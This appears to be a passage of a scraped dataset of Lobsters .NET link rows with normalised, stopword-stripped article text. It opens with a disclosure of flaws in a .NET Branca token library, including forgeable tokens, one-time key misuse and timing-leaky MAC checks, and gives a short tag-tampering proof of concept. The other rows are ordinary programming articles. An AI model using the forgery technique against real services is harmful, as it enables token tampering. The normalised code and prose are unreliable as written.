initializing xchachaengine payload encrypted authenticated var plaintextbytes payload var ciphertext new byte plaintextbyteslength engineprocessbytes plaintextbytes plaintextbyteslength ciphertext var poly new polyinit keymaterial polyblockupdate header headerlength polydofinal ciphertext plaintextbyteslength construction padding aad ciphertext authentication neither authentication length specified draft rfc rfc actually even authenticate ciphertext since dofinal writes current tag ciphertext ciphertext modified without invalidating token var handler new brancatokenhandler var key supersecretkeyyoushouldnotcommit var actualtoken handlercreatetoken test key var decoded actualtoken decoded decodedlength last byte tag consolewriteline handlerdecrypttoken decoded key payload running return tesu instead test thereby identitymodel allows attacker arbitrarily modify payload branca token searching bouncycastle found implementation following field private readonly private readonly imac might noticed engine implemented xchachaengine identitymodel turn identitymodel us variant nonce instead nonce required ietf version require ietf variant taking look chachaengine bouncycastle used calculate subkey nonce length set xchachaengine therefore left original djb using nonce meaning engineinit true parameter load byte nonce generated branca specification make pretty clear encrypt payload encrypt user given payload ietf aead userprovided secret key use header additional data aead made complicated code identitymodel one read draft rfc look another implementation eventually becomes clear combination forgeable token let return attempt authenticating header ciphertext specifically line keymaterial key used initialize xchachaengine sender must use cryptoonetimeauth authenticate one message key authenticator two message key expected reveal enough information allow forgery authenticator message nacl nacls documentation state given key used may used otherwise attacker could forge future authenticator problem since branca might used context like authenticating api call longlived api key used identitymodel allows attacker forge api token would problem identitymodel least used bouncycastle attempt branca implementation us first byte first keystreamblock byte internal state onetime key nonce unique every time used given key must key also unique course identitymodel use branca specification defines also safe randomly generate nonce see xcrypto limitation motivation behind see draft rfc constanttime mac comparison decent implementation compare mac constanttime reveal information via timing sidechannel unfortunately case identitymodel either var headermac new byte headermacsequenceequal tag throw new securitytokenexception invalid message authentication code bouncycastle us constanttime comparison provides comparison function utility arraysconstanttimeareequal macsize mmac mbuf resultlen throw new invalidciphertextexception mac check failed summary big fan rolling crypto talking implementing known algorithm even think making available github similar ask feedback good user warned security expected however problem arises project even uphold bare minimum testing test vector published warning used test vector case left identitymodel completely broken found mistake please reach
27,Lobsters,dotnet,"C#, F#, .NET programming",Domain Modeling Made Functional (2017),https://www.youtube.com/watch?v=Up7LcbGZFuo,domain modeling made functional,press copyright contact u creator advertise developer term privacy policy safety youtube work test new feature domain modeling made functional scott wlaschin youtube,press copyright contact u creator advertise developer term privacy policy safety youtube work test new feature domain modeling made functional scott wlaschin youtube
28,Lobsters,dotnet,"C#, F#, .NET programming",Best way to create an empty collection (array and list) in C# (.NET),https://www.tabsoverspaces.com/233833-best-way-to-create-an-empty-collection-array-and-list-in-csharp-net,best way create empty collection array list c net,best way create empty collection array list c net array static generic class static field holding empty array specific implementation list code specific implementation summary appendix,best way create empty collection array list c net aug min net net core c one apis working back needed return empty collection performance critical code yet decided would best way exploring learning signature required return list started testing array first expected arrayempty clear winner also interested common way stack array used new testarray ctor new testarray ctorinit arrayempty testarray arrayempty enumerableempty testarray toarray enumerableempty method mean error stddev ratio ratiosd gen gen gen allocated ctor n n n b ctorinit n n n b arrayempty n n n enumerableempty n n n expected arrayempty clear winner make sense return reference static generic class static field holding empty array ctor ctorinit virually different syntax il downside obviously allocation real array caching etc enumerableempty version slowest kind expected surprisingly allocate reason implementation behind emptypartition telement specific toarray implementation arrayempty used way file emptypartition telement called partitionspeedoptcs ok plain old array list actually needed list list different listempty something like similar fashion used new list testlist ctor new list testlist arrayempty testlist tolist arrayempty enumerableempty testlist tolist enumerableempty first two look little bit code execute including branching method mean error stddev ratio ratiosd gen gen gen allocated ctor n n n b n n n b arrayempty n n n b enumerableempty n n n b matter approach allocate allocate amount list turn contains array int field surprisingly ctor compared half expecting much difference learning new enumerableempty next relying emptypartition telement specific tolist implementation turn call ctor finally arrayempty slowest specific optimization case summary fastest way get empty array using arrayempty call list using new list aka straightforward way crazy idea appendix execution done environment oswindows intel core cpu kaby lake cpu logical physical core net core host net core coreclr corefx ryujit defaultjob net core coreclr corefx ryujit
29,Lobsters,dotnet,"C#, F#, .NET programming",Optimising LINQ,https://mattwarren.org/2016/09/29/Optimising-LINQ/,optimising linq,optimising linq problem linq joe duffy hidden allocation premature optimization evil myth jon skeet beauty closure heap allocation viewer aside roslyn based heap allocation analyser pointing optimised single iterator used one iterator needed note microoptimisations one talk profile benchmark coding guideline avoid linq essential truth everyone know performance large managed codebase hot path critical famous donald knuth quote yet pas opportunity critical roslynlinqrewrite linqoptimizer roslynlinqrewrite nessos linqoptimizer performance compile runtime comparison linq support linq query expression roslynlinqrewrite linqoptimiser total performance result benchmark code linqoptimiser lot backing storage roslynlinqrewrite benchmark code future option roslynlinqrewrite linqoptimiser qcon new york talk work already started rprogramming reading,optimising linq sep word problem linq outlined joe duffy linq introduces inefficiency form hidden allocation premature optimization evil myth take example technology quite supportive make writing inefficient code easy let look linqtoobjects quick many inefficiency introduced code int scale int input int lo int hi int c var result x input x lo x hi select x c return resultstoarray good question know probably jon skeet tell looking code fully understand problem need take look compiler u behindthescenes code end looking something like private int scale int input int lo int hi int c c c new c lo c hi c c return input int new func int bool c scale select int int new func int int c scale toarray int compilergenerated private sealed class public int c public int hi public int lo internal bool scale int x return x thislo x thishi internal int scale int x return x thisc see extra class allocated func perform actual logic even account overhead toarray call using iterators calling linq method via dynamic dispatch aside interested finding closure worth reading jon skeet excellent blog post beauty closure lot going behind scene actually possible shown hidden allocation directly visual studio install excellent heap allocation viewer plugin resharper get following tooltip right ide useful though recommend turning time seeing red line code tends make bit paranoid aside resharper roslyn based heap allocation analyser available provides similar functionality look way reduce impact linq worth pointing linq pretty neat trick ht oren novotny pointing instance common pattern followed select optimised single iterator used two would expect likewise two select statement row combined one iterator needed note microoptimisations whenever write post like inevitably get comment complaining premature optimisation something similar time want add following caveat way advocating linq bad thing think fantastic feature c language also please rewrite code based purely result microbenchmarks explain one talk always profile first benchmark way round temptation optimise needed said c compiler roslyn coding guideline actually state following avoid allocation compiler hot path avoid linq avoid using foreach collection struct enumerator consider using object pool many usage object pool compiler see example slightly ironic considering advice come people conceived designed linq first place outlined excellent talk essential truth everyone know performance large managed codebase found linq noticeable cost note hot path another way talking critical famous donald knuth quote forget small efficiency say time premature optimization root evil yet pas opportunity critical roslynlinqrewrite linqoptimizer clearly could manually rewrite linq statement iterative version concerned performance much nicer tool could hard work u well turn first roslynlinqrewrite per project page tool compiles c code first rewriting syntax tree linq expression using plain procedural code minimizing allocation dynamic dispatch also available nessos linqoptimizer automatic query optimizercompiler sequential parallel linq linqoptimizer compiles declarative linq query fast loopbased imperative code compiled code fewer virtual call heap allocation better data locality speedup check performance page highlevel main difference roslynlinqrewrite work compile time prevents incremental compilation project code change except want opt via nolinqrewrite linqoptimiser work runtime force add asqueryexpr run linq method optimises parallel linq rest post look tool detail analyse performance comparison linq support obviously choosing either tool want sure actually going optimise linq statement code base however neither tool support whole range available linq query expression chart illustrates method roslynlinqrewrite linqoptimiser select yes yes tolist yes toarray yes count yes foreach yes reverse cast oftype firstfirstordefault singlesingleordefault lastlastordefault todictionary longcount elementatelementatordefault contains aggregate sum selectmany taketakewhile skipskipwhile groupby orderbyorderbydescending thenbythenbydescending total performance result finally get main point blog post different tool perform achieve stated goal optimising linq query reducing allocation let start common scenario using linq filter map sequence number ie c var result itemswhere select compare linq code optimised version plus iterative form serve baseline result full benchmark code first thing jump linqoptimiser version allocating lot memory compared others see happening need look code generates look something like ienumerable int linqoptimizer int input var collector new nessoslinqoptimizercorearraycollector int int counter counter inputlength counter var input counter var result collectoradd result return collector issue default arraycollector allocates int backing storage hence excessive allocation contrast roslynlinqrewrite optimises code like ienumerable int int linqitems linqitems null throw new systemargumentnullexception int index index linqitemslength index var linqitem linqitems index linqitem var linqitem yield return much sensible using yield keyword get compiler hard work allocate temporary list store result mean streaming value way original linq code lastly look one example time using count expression ie itemswhere count clearly see tool significantly reduce allocation compared original linq code full benchmark code future option however even though using roslynlinqrewrite linqoptimiser pretty painless still install party library project even nicer net compiler jitter andor runtime optimisation u well certainly possible joe duffy explains qcon new york talk work already started maybe wait long discus post rprogramming reading
30,Lobsters,dotnet,"C#, F#, .NET programming",Visitor and multiple dispatch via C# 'dynamic' (2011),https://www.shawnhargreaves.com/blog/visitor-and-multiple-dispatch-via-c-dynamic.html,visitor multiple dispatch via c dynamic,visitor multiple dispatch via c dynamic design pattern emulate missing language feature series article exploring visitor pattern multiple dispatch dynamic,ï visitor multiple dispatch via c dynamic somewhat convincing argument software design pattern really attempt emulate missing language feature eric lippert recently wrote series article exploring one might attempt implement virtual method pattern already built c interesting see thing work behind scene would course crazy actually hand language already provides convenient virtual keyword ah codification convenience wherein cheerfully constrain choice order conceal complexity virtual method allow u dynamically choose code execute depending type object dealing ubiquitous modern object oriented language easy forget missing couple sometimes important feature want run code member function type question perhaps nt type modify maybe nt make sense implement code member problem visitor pattern designed solve never seen visitor implementation nt strike ugly overly complex want choose code based type one object feature called multiple dispatch lisp programming language directly support c rescue dynamic keyword added c designed simplify interop statically typed c dynamically typed language com component deferring method resolution compile time runtime dynamically applying overload selection logic c compiler would normally use compile time interestingly exactly need implement multiple dispatch virtual dispatch non instance method aka visitor pattern consider simple class hierarchy class animal class cat animal class dog animal class mouse animal create several overload method specialized according different combination parameter type void reactspecialization animal animal consolewriteline interested void reactspecialization cat dog consolewriteline cat run away dog void reactspecialization cat mouse consolewriteline cat chase mouse void reactspecialization dog cat consolewriteline dog chase cat magic part void react animal animal reactspecialization dynamic dynamic work dynamic cast tell c compiler rather calling reactspecialization animal animal dynamically examine type parameter make runtime choice method overload invoke prove really work void test animal cat new cat animal dog new dog animal mouse new mouse react cat dog react cat mouse react dog cat react dog mouse output cat run away dog cat chase mouse dog chase cat dog interested mouse note especially last dog mouse call provide specialized method parameter type automatically fell back closest matching alternative case animal animal overload suitable fallback overload would raised runtime exception instead course dynamic invoke free probably nt something want rely core game loop used technique heavily build time processing tool plenty fast enough even show profiler vastly simplified would otherwise complex type dispatch logic
31,Lobsters,dotnet,"C#, F#, .NET programming",Extreme programming meets systematic testing using Coyote,https://cloudblogs.microsoft.com/opensource/2020/07/14/extreme-programming-meets-systematic-testing-using-coyote/,extreme programming meet systematic testing using coyote,annals wiki challenge coyote producerconsumer queue challenge wiki page heisenbug coyote synchronizedblock explaining bug lesson complete code article,world increasingly reliant cloud service expected high availability handle high throughput minimal latency service also expected resilient reliable presence internal external failure maintaining high quality bar presence continuous evolution change tall task bug fall crack despite rigorous testing good intention running unit test integration test every checkin standard industry practice even stress test service ensure reliability performance subtle bug still slip important realize source complexity chance taming service inherently concurrent nature rest apis called concurrently must prepared handle interleaving call often distributed across fleet machine make dealing concurrency challenging readily use primitive like lock semaphore writing correct concurrent code always hard combinatorics state space say exponential desperately need new tool arsenal help u tame complexity coyote one tool article highlight coyote capability applying delightfully interesting example annals wiki tom cargill posed challenge extreme programming community saying concurrent program hard test combinatorial explosion state space must covered state space explodes arbitrary context switching scheduler general impossible use external input force program state must covered conventional test harness mechanism influencing scheduler well turn exactly coyote designed solve let walk coyote easily solve programming problem posed tom cargill shared boundedbuffer implementation written java known tricky deadlock bug coyote work net following c version example using net systemthreadingmonitor contains bug using systemthreading class boundedbuffer public void put object x lock thissyncobject thisoccupied thisbufferlength monitorwait thissyncobject thisoccupied thisputat thisbufferlength thisbuffer thisputat x monitorpulse thissyncobject public object take object result null lock thissyncobject thisoccupied monitorwait thissyncobject thistakeat thisbufferlength result thisbuffer thistakeat monitorpulse thissyncobject return result private readonly object syncobject new object private readonly object buffer new object private int putat private int takeat private int occupied boundedbuffer implement buffer fixed length concurrent writer adding item buffer reader consuming item buffer reader wait item buffer writer wait buffer full resuming slot consumed reader also known producerconsumer queue concrete ask community find particular bug cargill knew program metaask come methodology catching bug rapidly point worthwhile take moment reason program see spot bug might also helpful read discussion challenge wiki page spot bug difficulty seeing bug alone almost one wiki thread able spot bug rigorous testing jvm reliably reproduce bug either lead skepticism bug implementation tricky bug find add kind console debugging statement debug bug go away classic heisenbug decided apply coyote challenge coyote systematically control explores concurrency nondeterminism encoded program perfect fit challenge like coyote provides dropin replacement systemthreadingmonitor called synchronizedblock allows coyote precisely control concurrency program systematically explore possibility following implementation boundedbuffer implementation using coyote public class boundedbuffer public boundedbuffer int buffersize thisbuffer new object buffersize public void put object x using var monitor synchronizedblocklock thissyncobject thisoccupied thisbufferlength monitorwait thisoccupied thisputat thisbufferlength thisbuffer thisputat x monitorpulse public object take object result null using var monitor synchronizedblocklock thissyncobject thisoccupied monitorwait thistakeat thisbufferlength result thisbuffer thistakeat monitorpulse return result private readonly object syncobject new object private readonly object buffer private int putat private int takeat private int occupied straightforward translation original code c leveraging coyote synchronizedblock write small test driver program coyote use find bug first test write might look like microsoftcoyotesystematictestingtest public static void testboundedbuffertrivial icoyoteruntime runtime boundedbuffer buffer new boundedbuffer var task new list task taskrun reader buffer taskrun writer buffer taskwaitall taskstoarray setup two task first reader calling take writer calling put following implementation test reader writer method private static void reader boundedbuffer buffer int iteration int iteration object x buffertake private static void writer boundedbuffer buffer int iteration int iteration bufferput hello clearly put number item take otherwise trivial deadlock waiting item matched test iteration put take find deadlock run test despite coyote systematically exploring different possible interleavings put take call bug might bit challenging find let think second following variable play buffer size number concurrent reader number concurrent writer number iteration inside task bug might trigger certain configuration configuration use coyote explore state space configuration luckily generate random number reader writer buffer length iteration letting coyote explore configuration coyote also explore task interleavings configuration following slightly interesting coyote test explores configuration letting coyote control nondeterminism introduced random variable scheduling resulting number task microsoftcoyotesystematictestingtest public static void testboundedbufferfinddeadlockconfiguration icoyoteruntime runtime var random microsoftcoyoterandomgeneratorcreate int buffersize randomnextinteger int reader randomnextinteger int writer randomnextinteger int iteration randomnextinteger int totaliterations iteration reader int writeriterations totaliterations writer int remainder totaliterations writer runtimeloggerwriteline testing buffer size reader writer iteration buffersize reader writer iteration boundedbuffer buffer new boundedbuffer buffersize runtime var task new list task int reader tasksadd taskrun reader buffer iteration int x int writer int w writeriterations writer w remainder x w tasksadd taskrun writer buffer w taskwaitall taskstoarray test using coyote test tool see coyote find magic test configuration creates deadlock coyote test boundedbufferdll iteration boundedbufferexampleprogramtestboundedbufferfinddeadlockconfiguration output following starting testingprocessscheduler process created testing task task using random strategy iteration iteration iteration iteration iteration iteration iteration iteration iteration iteration iteration task found bug emitting task trace writing writing elapsed sec testing statistic found bug scheduling statistic explored schedule fair unfair found buggy schedule number scheduling point fair terminating schedule min avg max elapsed sec done see coyote found bug quickly second found bug iteration log file contains telltale message deadlock detected task waiting task complete controlled task enabled task task task task task task task task task task waiting acquire resource already acquired controlled task enabled also see log writeline show u configuration failed testing buffer size see took total nine concurrent task five reader four writer buffer size one generate deadlock take deeper look deadlock let see smaller configuration also reproduce bug help find minimal test coyote test handy option called tell coyote keep testing given iteration report bug found like coyote test boundedbufferdll iteration explore verbose boundedbufferexampleprogramtestboundedbufferfinddeadlockconfiguration logtxt coyote found test configuration failed want minimal test filter logtxt file print configuration one writer result testing buffer size testing buffer size testing buffer size testing buffer size testing buffer size testing buffer size testing buffer size testing buffer size testing buffer size testing buffer size testing buffer size indeed see clearly minimal test two reader one writer also see deadlock found buffer size one small number iteration write minimal test use iteration sure deadlock often microsoftcoyotesystematictestingtest public static void testboundedbufferminimaldeadlock icoyoteruntime runtime boundedbuffer buffer new boundedbuffer var task new list task taskrun reader buffer taskrun reader buffer taskrun writer buffer taskwaitall taskstoarray run outside coyote deadlock almost every time expected add consolewritelines inside boundedbuffer implementation deadlock longer occurs due heisenbug nature consolewriteline somehow change timing enough deadlock longer occurs test new method using coyote test using boundedbufferexampleprogramtestboundedbufferminimaldeadlock fortunately coyote also produce another log file called magic file coyote use replay bug using coyote replay boundedbufferdll boundedbufferexampleprogramtestboundedbufferminimaldeadlock step program debugger take long want bug always found huge advantage anyone debugging kind heisenbugs explaining bug coyote found bug dive explore really happening added detailed logging take put method replayed buggy trace using coyote replay feature ended following graph horizontal axis represents time vertical axis represents various step inside take put method take put method similar structure share vertical axis program start two reader task attempting take item buffer buffer empty point go wait state woken pulse signal sole writer task start next put item buffer sends pulse signal awakens first task entered wait queue reader task start running however writer task able reacquire lock start second run happen due nondeterminism operating system thread scheduling crucial step creating bug buffer already full writer task go wait state reader finally get chance run consumes item buffer sends pulse signal wake next task wait queue since reader head queue run next immediately block buffer still empty point writer task reader task blocked reader task run go wait state buffer empty point three task waiting state application deadlocked deadlock requires numerous iteration reader writer random scheduling decision operating system order occur difficult foresee reliably reproduce given understanding also get hint right fix one fix use pulseall wake every indeed work another perhaps efficient fix send pulse right calling wait way reader task sends another pulse wake writer task thing could proceed also test fix using coyote full testboundedbufferfindconfiguration test function make sure find another pesky test configuration lesson coyote able help u quickly find way trigger subtle race condition lead deadlock boiled simplest possible reproducible trace making test smaller made easier find bug counter intuitive developer traditionally stress test application large number request trigger race condition might still able reliably reproduce coyote hand systematically explores state space reliably reproduce bug much smaller test fact efficiency coyote finding bug increase test get smaller bug implementation obvious fact author spend time poring coyote reproducible trace finally grokking bug speaks effectiveness tool like coyote inability human always foresee subtle race condition like boundedbuffer implementation may seem academic important generalize lesson exercise see apply production service production service contain way two method put take example expose number rest apis called highly concurrent manner operate shared resource like underlying buffer example distributed service always use concurrency control mechanism like lock coordinating work across independent backend service use distributed transaction coordinate data say two independent partition scalable keyvalue store like cosmosdb furthermore individual node distributed service crash point time developer must gracefully deal failure possible step dealing external state constantly evolving changing hard problem appreciating complexity size state space first step towards building reliable software service tool like coyote help team tame combinatorial complexity systematically exploring state space catch safety liveness violation every checkin allow get best world extreme programming without sacrificing quality tool magically find bug best tool one work developer enabling follow intuition helping design efficient maintainable test service think coyote indeed one tool complete code article available github question feedback please let u know comment
32,Lobsters,dotnet,"C#, F#, .NET programming",Modernising .NET projects for .NET Core and beyond,https://dwmkerr.com/modernising-dotnet-projects/,modernising net project net core beyond,net core net framework net core future net framework read net framework read c net core satya nadella read net core divergence net standard net standard convergence net net challenge modernisation compatibility modernisation process introducing two villain sharpgl opengl sharpshell step understand domain net framework net core porting guide step understand goal multiplatform build step migrate project leafwise porting guide porting guide step refactor rinse repeat target framework sdkstyle project step update build step simplify pull request sharpshell pull request step test test test step document compatibility key learning consumer experience developer experience maintainer experience useful reference,world net going transformation net framework reaching end life net core increasingly feature rich robust platform develop solution target linux macos embedded device container also net standardbut mean net framework project article describe modernise net framework project net core net standard net planned released year also explain high level difference platform consequence upgrading consumer developer maintainersthe net framework net core futurethere lot written topic still little overwhelming understand thing fit togetherhere simple visual created try put thing context going cover bare essential link reading topic want go deeper article mainly going focused practicality consequence migration retargetingfirst net frameworkthe net framework created set unified tool standard allow developer microsoft platform quickly build solution provide interoperability language read net frameworkthe net framework rapidly gained popularity partly due convenience developing c rather basic cc c provided developer friendly language c c many use case heavily inspired java read c increase popularity net framework started frequent release became standard part window operating system installed box rather ondemand neededhowever net framework functioned microsoft window greatly limited potential us case even engineer used web client application mobileenter net coremicrosoft signaled radical switch strategy appointment satya nadella becoming increasingly focused open source importantly deciding microsoft development toolchain force user use window execution environmentnet core developed lightweight version net framework could run multiple platform including linux macos read net corein short period time net core became feature rich providing lot capability web developer frontend application developersthe challenge divergence net standardas net core became feature rich api became closer net framework still fundamentally different runtimes binary compiled net core run net framework viceversato deal issue microsoft developed net standard specification set apis runtime offered apis solution built runtime meet standard could run compliant platformwhat mean basically table show consequence build net core example also run net framework mono unity runtimes implement net standard course feature always going platform specific standard started small grown timemoving convergence netgiven later version net framework net core actually follow standard platform actually starting become similarthey becoming similar longer make sense maintain separately next major version platform net new runtime next version net core net frameworkthis mean net framework net core going converge single platform wonderful developer simplify complex landscapebut mean net framework project modernise make tradeoff around compatibility challenge modernisation compatibilityi number project target net framework project multiple request migrate net core hold work could really understand detail thing would mean consumer library would change platform use could break thing would mean developer platform would need change development environment would cause problem would mean maintainer library would greatly increase build deployment complexity finally found time able start address issue detail hopefully learning useful anyone maintaining net codebase thinking futurethe modernisation process introducing two villainsthere two key project wanted modernise reasonably well used complex potentially serious complexity multiplatform buildssharpgl library allows developer use opengl net application big challenge opengl cross platform sharpgl specifically provides interface window version opengl possibly made futureproof could ever target platform sharpshell library allows developer build shell extension window shell extension customisations window user interface would portable across platform still want ensure project future proofwhat would experience two project net project far le popular much simple instinct work process project others straightforwardthese step followed modernise finish article summary key learningsstep understand domaini stress enough meaningful technology work understand domain dealing quick google migrate following formal migration guide enough knew actually understand reasonably detailed level difference runtime tradeoff process complexitythis article result work sometimes writing topic best way force learn itmaking change rapidly waiting see consequence often work small project internal tool library relied upon others good community last thing wanted make change unintended consequence user making sure learnt space thing work hood expected change future criticalhopefully others process understanding domain little easier article cover high level topic actual process writing migrating went lot deeper article goesthe key document follow actually execute migration excellent official net framework net core porting guidestep understand goal multiplatform buildsgiven understanding domain made much easier understand required step would essentially would needed would target version net framework adheres recent version net standard done theory project could built net framework net core also ready upcoming net releasemultiplatform build supported visual studio build allow u single codebase build library multiple platform ie net framework net core resulting binary packed single package consumer install package appropriate library installedthis introduces first significant consequence modernising project mean must migrate visual studio past might issue license visual studio expensive many organisation locked onto specific version compatibility issue slow upgrade seems case le often nowadays still important considerationmy project using visual studio project property looked unsurprisingly net standard nt mentioned time upgrade installed could reminisce excitement buying visual c net learning edition try remember like year old wonder box set still kicking around somewhere want see much changed long install process visual studio nt least kept installing remember enable net core featuresstep migrate project leafwise per porting guide need migrate project make solution starting leaf project nt depend project moving tree root project project depended others visually solution like sharpgl would mean project need converted following order expecting project quite different experience sharpglserialization set class load data file theory library become completely portablesharpglwpf sharpglwinforms specifically window frontend technology expected able ported nt expect work platform future might sharpglosx sharpglgnome know sharpglscenegraph set class represent scene thing like light camera material expect work thing like image loading perhaps need tweakingsharpgl wrapper around window library ca nt imagine working anywhere window would project structure porting go would build detail migrate project porting guide general approach attempt convert latest project format tryconvert toolretarget project net framework first version support net standard repeat project project depends walking tree project rootrun portability analysis tool see apis available certain platformsthis project might look migration run tryconvert need edit project file change line targetframework targetframework targetframeworks targetframeworks target choose depend apis want use portability analysis extension available build portability report one look like also show specific apis compatible specific target time move next stepstep refactor rinse repeatthis tricky part need work whether want remove api call portable try use alternative conditionally compile code different platformsif using nonportable apis may need use conditional block execute different code depending framework used target framework sdkstyle project guide show thisyou may also manually edit project file ensure certain dependency used certain target solution file dependency may end looking something like reloaded project see dependency specified perframework basis build generates assembly target process might simple complex depending nuance project fairly iterative starting targeting original target framework used adding targetssome target simply possible example net core support winforms wpf net core onwards wo nt able build winforms wpf assembly target lower version framework nt support itstep update buildsat stage fixed compatibility issue code build visual studionow would recommend porting build code use dotnet build system going maximise portability futureproof project able run build multiple platform using preferred standard tool msbuild essentially become legacy way like structure thing personally set script run build test package code locally call script ci tool choice automate thing still keep logic code rather hidden away build systemfor example sharpgl project following script machine run build installing necessary component nunit need run test including coverage report report written sharpgl nuget package copied artifactspackagesi updated script use dotnet tool example build script look something like run build hiding documentation warning pinvoke code buildcommand dotnet msbuild psscriptrootsharpglsln nowarn nowarn rebuild p configurationrelease writehost running buildcommand invokeexpression buildcommand pack script look like dotnet pack norestore nobuild psscriptrootcoresharpglsharpglcsproj c release dotnet pack norestore nobuild psscriptrootcoresharpglscenegraphsharpglscenegraphcsproj c release dotnet pack norestore nobuild psscriptrootcoresharpglserializationsharpglserializationcsproj c release dotnet pack norestore nobuild psscriptrootcoresharpglwinformssharpglwinformscsproj c release dotnet pack norestore nobuild psscriptrootcoresharpglwpfsharpglwpfcsproj c release actual script little complex key thing run part cicd process locally test debug cicd platformyou likely conditionally reference certain component dependency might different see many project file code like itemgroup reference include systemdesign condition targetframework reference include systemdesign condition targetframework reference include systemdesign condition targetframework reference include systemwindowsforms condition targetframework reference include systemwindowsforms condition targetframework reference include systemwindowsforms condition targetframework itemgroup itemgroup packagereference include microsoftcsharp version condition targetframework packagereference include microsoftcsharp version condition targetframework packagereference include microsoftcsharp version condition targetframework packagereference include microsoftcsharp version condition targetframework packagereference include systemdatadatasetextensions version condition targetframework packagereference include systemdatadatasetextensions version condition targetframework packagereference include systemdatadatasetextensions version condition targetframework packagereference include systemdatadatasetextensions version condition targetframework itemgroup case quite bit trial error needed find appropriate reference platformstep simplify one benefit found process simplify project longer need kind automated nuget restore functionality mean remove code like project file import project solutiondir nugetnugettargets condition exists solutiondir nugetnugettargets target name ensurenugetpackagebuildimports beforetargets prepareforbuild propertygroup errortext project reference nuget package missing computer use nuget package restore download information see http gomicrosoftcomfwlink missing file errortext propertygroup error condition exists text systemstring format errortext error condition exists text systemstring format errortext target also remove projectjson data csproj fileanother nice update longer need maintain assemblyinfocs file keep assembly metadata csproj filefinally almost certainly remove nuspec file nuget packaging data also embedded csproj file example sharpshell project metadata look like project sdk microsoftnetsdkwindowsdesktop propertygroup targetframeworks targetframeworks outputtype library outputtype following properies used manage project packaged packageid sharpshell packageid copyright copyright c dave kerr copyright packageprojecturl http githubcomdwmkerrsharpshell packageprojecturl repositoryurl http githubcomdwmkerrsharpshell repositoryurl version version author dave kerr author company dave kerr company packagetags shell sharpshell com context menu icon handler packagetags description sharpshell framework let build window shell extension using net core net framework description propertygroup snip project help keep lot project dependency property data one place probably convenient many usersyou see pull request sharpgl see project file updated case also see sharpshell pull request sharpshell version still work progress time writingstep test test testnow fun part going really test new package platform sadly kind migration something issue exposed via unit test need create test project import package ideally platform make sure work could runtime error particularly made mistake referencesmany issue caught compile time nothere screenshot fun trying net framework package winforms net core package wpf test package dependent building highly platform specific likely lot testing fairly selfcontained code might able get away basic smoke testingstep document compatibilityif supporting multiple platform framework going lot help consumer code clear supportedthis may complex think library may run fine part net core console application window work macos linux screenshot would never imagined started sharpgl project terminal application running macos using sharpglserialization library load geometry file course something like sharpgl run mac linux lot work would needed sharpgl core nothing wrapper around window platform dlls opengl still available support possible ready yet stage docmenting know work well nt really helpfulyou might also want preserve premigration code separate branch case user reason issue migrating need use older version sharpgl updated project page indicate compatibility tested key learningshere key learning stood worked migration projectsconsumer experienceif careful nt break anything consumer multitargeting still target older frameworksyou potentially greatly increase compatibility project offering support net coredeveloper experienceyou need upgrade visual studio mldr mldr however use visual studio mac even commandline build across many platformsmaintainer experienceyou much larger set potential consumer likely find bug framework platform specificyou likely need work migrating project file use latest dotnet toolingyou careful document known compatibility issuesall process le painful expected work done focus exciting thing potentially getting project like sharpgl working linux macos much excitingas always question comment suggestion rant anything welcome pull request migrates sharpgl project sharpshell project useful reference
33,Lobsters,dotnet,"C#, F#, .NET programming",Nodexr: A node-based Regular Expression editor,https://github.com/jcparkyn/nodexr/,nodexr nodebased regular expression editor,nodexr nodexr published feature use node replacement contributing issue also check regex node,nodexr nodexr nodebased regular expression editor created c blazor nodexr published also try starting one example expression screenshot show regular expression used match floating point number without exponent feature us full net regex engine search replace unlike online regex tool show result search replace using net regex engine browser realtime full syntax highlighting hover section output see node generated node used work almost net regex spec additional functionality implemented either using text node without escaping custom group node nodebased approach make almost impossible syntax error missing parenthesis etc except certain node enter existing regex parsed fully editable node tree using edit button next output work expression complexity level although couple niche feature ca nt yet parsed properly create shareable link expression send someone else come back later feature currently relies expression parsing case node tree little different sharing expression information node found clicking button next title automatically deal noncapturing group longer think case run completely clientside communication server initial page load use draganddrop node left panel insert main window final resultoutput node must connected output node displayed top left main concept nesting behaviour regex expressed connecting one node input another item sequence connected using previous input top left node expression alternatively connected sequence concatenated using concatenate node output expression empty unless one node connected output node node information node found clicking button next title use regex functionality implemented provided node create text node escape disabled input part expression manually replacement use bottom panel test string searching andor replacement valid net regex replacement string used including named andor numbered group reference bottom right panel show result replacement contributing contribution welcome ideally start creating issue also check similar tool called regex node made johannes vollmer connection nodexr regex node fact nt even know existed released polished alternative need javascript regular expression
34,Lobsters,dotnet,"C#, F#, .NET programming",V-Drum Explorer: Blazor and the Web MIDI API,https://codeblog.jonskeet.uk/2020/07/12/v-drum-explorer-blazor-and-the-web-midi-api/,vdrum explorer blazor web midi api,blazor web midi api friday ne tech web midi api blazor maui jsfiddle saturday morning step jsfiddle midi test initialize midi handy set example http test list midi port test dump midi message console test request name kit step vanilla blazor project step listing midi port blazor substep create new page substep initialize midi blazor university javascript interop substep use callback better library pattern javascript best practice blog post substep listing midi port step retrieve kit name blazor whoa stack overflow question stack overflow question saturday afternoon step retrieve kit name blazor saturday evening interlude refactoring midi access managedmidi sunday morning rewriting existing application code blog post implementing midi interface generalizing application code sunday afternoon publishing web site google cloud storage configuring bucket appropriately tidying blazor app speeding kit name access republish gsutil tool load balancer updating conclusion http vdrumexplorerjonskeetuk normal place like,blazor web midi api friday yesterday speaking ne tech user group vdrum explorer someone mentioned web midi way accessing local midi device browser grasp javascript tenuous okay write c using blazor theory could build equivalent vdrum explorer running entirely browser using webassembly mean never worry installer want get ahead suspect wpf later maui still way forward least prove fun investigation never used web midi api used blazor year weekend sure find spare hour let see far get kick going write progress blog post go adding timestamp periodically see long take thing admittedly whilst writing time promise edit post clarity typo etc idea turn complete failure life goal mind end weekend blazor web app running locally start deploying hard interesting point detect drum module list name kit module list step expect take see go use jsfiddle try access web midi api list port open input output port listen midi message dumped console send sysex message hardcoded request name kit start new blazor project check get work try access midi port blazor listing port start expand midi access test everything step loop kit instead first one involve checksum computation app copying code vdrum explorer project get far happy bonus step get far would really interesting try depend vdrum explorer project vdrumexplorermodel vdrumexplorermidi modifying midi project use web midi point code blazor app could really quite displaying readonly tree view probably hard maybe sound like fun weekend ahead saturday morning step jsfiddle midi time turn bring midi api doc jsfiddle let give strike might useful able save effort jsfiddle account may necessary may make thing let create account first problem see make console expect result end single line bottom right hand corner could open chrome console course jsfiddle one would nice use let see happens write ah expands data okay test initialize midi midi api doc really handy set example copypaste finding hard resist temptation change whitespace something comfortable copy example failed get midi access securityerror failed execute requestmidiaccess navigator midi disabled document feature policy darn look featurepolicy mdn search jsfiddle featurepolicy find http 